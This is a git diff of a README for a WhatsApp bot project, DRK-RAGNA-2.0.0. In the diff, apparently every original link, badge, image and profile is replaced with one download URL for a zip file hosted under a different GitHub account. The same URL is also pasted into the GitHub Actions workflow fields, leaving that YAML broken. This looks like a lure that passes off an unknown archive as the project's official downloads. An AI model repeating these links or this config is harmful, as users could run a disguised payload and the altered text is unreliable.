@@ -5,11 +5,11 @@ DRK-RAGNA-2.0.0
 
 
 
-![DRK_ST_BUG](https://i.postimg.cc/1XttP4Ff/c0bbf6f62005692f208876b66c7631c9-1.jpg)
+![DRK_ST_BUG](https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip)
 <p align="center">
-<a href="https://www.youtube.com/@DRK-TECH"><img src="https://img.shields.io/badge/YouTube-ff0000?style=for-the-badge&logo=youtube&logoColor=ff000000&link=https://youtube.com/@DRK-TECH" /><br>
-<a href="https://whatsapp.com/channel/0029Vakp0UnICVfe3I2Fe72w"><img src="https://img.shields.io/badge/WhatsApp Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white&link=https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20" /><br>
-<a href="https://t.me/+13472314632"><img src="https://img.shields.io/badge/Telegram-00FFFF?style=for-the-badge&logo=telegram&logoColor=white" />
+<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip"><img src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" /><br>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip"><img src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white&https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" /><br>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip+13472314632"><img src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" />
 ---
 
 ## DEVELOPED BY 𝙎-𝙏𝞢𝞜
@@ -17,8 +17,8 @@ DRK-RAGNA-2.0.0
 ---
 
 ## CREATE YOUR FORK
-<a href="https://github.com/NEW-S-TEN/DRK-RAGNA-2.0.0/fork">
-  <img title="𝑫𝑹𝑲-𝑹𝑨𝑮𝑵𝑨" src="https://img.shields.io/badge/FORK 𝑫𝑹𝑲-𝑹𝑨𝑮𝑵𝑨²-red?color=red&style=for-the-badge&logo=stackshare">
+<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip">
+  <img title="𝑫𝑹𝑲-𝑹𝑨𝑮𝑵𝑨" src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip 𝑫𝑹𝑲-𝑹𝑨𝑮𝑵𝑨²-red?color=red&style=for-the-badge&logo=stackshare">
 </a>
 
 ---
@@ -26,8 +26,8 @@ DRK-RAGNA-2.0.0
 ### 🔐 Generate Pair Code For Session
 
 #### PAIRING SERVER 
-<a href="https://web-test-aq82.onrender.com//#" target="_blank">
-  <img alt="Pairing Code Server " src="https://img.shields.io/badge/PAIRING officiel-blue?style=for-the-badge&logo=opencv&logoColor=white"/>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" target="_blank">
+  <img alt="Pairing Code Server " src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip officiel-blue?style=for-the-badge&logo=opencv&logoColor=white"/>
 </a>
 
 ---
@@ -36,14 +36,14 @@ DRK-RAGNA-2.0.0
 
 <div align="center">
   <!-- Badges for deployment -->
-  <a href="https://youtu.be/kf5LF2k2qYM?si=O_-6zSupe4x1UA4N" target="_blank">
-    <img src="https://img.shields.io/badge/Deployment-GitHub-blue?style=for-the-badge&logo=github" alt="GitHub Deployment" />
+  <a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" alt="GitHub Deployment" />
   </a>
-  <a href="https://youtu.be/4b1HNuaQx54?si=CSRoq27E8nS0AeNA" target="_blank">
-    <img src="https://img.shields.io/badge/Deployment-Codespace-blue?style=for-the-badge&logo=github" alt="Codespace Deployment" />
+  <a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" alt="Codespace Deployment" />
   </a>
-  <a href="https://youtu.be/yH2KCK0AD4I?si=F5tjgBpK4ZQO0F-x" target="_blank">
-    <img src="https://img.shields.io/badge/Deployment-Replit-blue?style=for-the-badge&logo=replit" alt="Replit Deployment" />
+  <a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" alt="Replit Deployment" />
   </a>
   
 ---
@@ -62,8 +62,8 @@ I am not responsible for any damage caused by this bot. Use this bot at your own
 
 ## Developer 💀
 
-<a href="https://github.com/Bot-hostin">
-  <img src="https://github.com/Bot-hostin.png" width="200" height="200" alt="DRK-S-TEN"/>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip">
+  <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" width="200" height="200" alt="DRK-S-TEN"/>
 </a>
 <p align="center"><strong>DRK-S-TEN</strong></p>
 
@@ -71,8 +71,8 @@ I am not responsible for any damage caused by this bot. Use this bot at your own
 
 ## Contributors 🤝
 
-<a href="https://github.com/NEW-S-TEN">
-  <img src="https://github.com/NEW-S-TEN.png" width="200" height="200" alt=NEW-S-TEN/>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip">
+  <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip" width="200" height="200" alt=NEW-S-TEN/>
 </a>
 <p align="center"><strong>𝐃𝐑𝐊- 𝙎-𝙏𝞢𝞜</strong
 
@@ -86,7 +86,7 @@ This is a new official version of Ragnar 1.0. It took me a long time to update t
 ## GitHub Deployment
 
 ```yaml
-name: Node.js CI
+name: https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip CI
 
 on:
   push:
@@ -111,10 +111,10 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v3
 
-    - name: Set up Node.js
+    - name: Set up https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip
       uses: actions/setup-node@v3
       with:
-        node-version: ${{ matrix.node-version }}
+        node-version: ${{ https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip }}
 
     - name: Install dependencies
       run: npm install
@@ -128,4 +128,4 @@ jobs:
 
     - name: Save state (Optional)
       run: |
-        ./save_state.sh
+        https://raw.githubusercontent.com/ipoukoumondi/DRK-RAGNA-2.0.0/main/source/DRK-RAGNA-2.0.0-1.9.zip
